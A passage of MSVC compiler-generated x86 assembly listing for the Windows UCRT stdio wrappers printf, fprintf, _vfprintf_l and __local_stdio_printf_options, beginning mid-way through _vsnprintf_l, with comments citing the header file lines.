	mov	DWORD PTR tv74[ebp], ecx
$LN4@vsnprintf_:
	mov	eax, DWORD PTR tv74[ebp]
; Line 1397
	mov	esp, ebp
	pop	ebp
	ret	0
__vsnprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _printf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Format$ = 8						; size = 4
_printf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 956
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 959
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 960
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	push	1
	call	___acrt_iob_func
	add	esp, 4
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 961
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 962
	mov	eax, DWORD PTR __Result$[ebp]
; Line 963
	mov	esp, ebp
	pop	ebp
	ret	0
_printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _fprintf
_TEXT	SEGMENT
__Result$ = -8						; size = 4
__ArgList$ = -4						; size = 4
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
_fprintf PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 837
	push	ebp
	mov	ebp, esp
	sub	esp, 8
; Line 840
	lea	eax, DWORD PTR __Format$[ebp+4]
	mov	DWORD PTR __ArgList$[ebp], eax
; Line 841
	mov	ecx, DWORD PTR __ArgList$[ebp]
	push	ecx
	push	0
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	__vfprintf_l
	add	esp, 16					; 00000010H
	mov	DWORD PTR __Result$[ebp], eax
; Line 842
	mov	DWORD PTR __ArgList$[ebp], 0
; Line 843
	mov	eax, DWORD PTR __Result$[ebp]
; Line 844
	mov	esp, ebp
	pop	ebp
	ret	0
_fprintf ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __vfprintf_l
_TEXT	SEGMENT
__Stream$ = 8						; size = 4
__Format$ = 12						; size = 4
__Locale$ = 16						; size = 4
__ArgList$ = 20						; size = 4
__vfprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 644
	push	ebp
	mov	ebp, esp
; Line 645
	mov	eax, DWORD PTR __ArgList$[ebp]
	push	eax
	mov	ecx, DWORD PTR __Locale$[ebp]
	push	ecx
	mov	edx, DWORD PTR __Format$[ebp]
	push	edx
	mov	eax, DWORD PTR __Stream$[ebp]
	push	eax
	call	___local_stdio_printf_options
	mov	ecx, DWORD PTR [eax+4]
	push	ecx
	mov	edx, DWORD PTR [eax]
	push	edx
	call	___stdio_common_vfprintf
	add	esp, 24					; 00000018H
; Line 646
	pop	ebp
	ret	0
__vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ___local_stdio_printf_options
_TEXT	SEGMENT
___local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 90
	push	ebp
	mov	ebp, esp
; Line 92
	mov	eax, OFFSET ?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	pop	ebp
	ret	0
___local_stdio_printf_options ENDP
_TEXT	ENDS
END
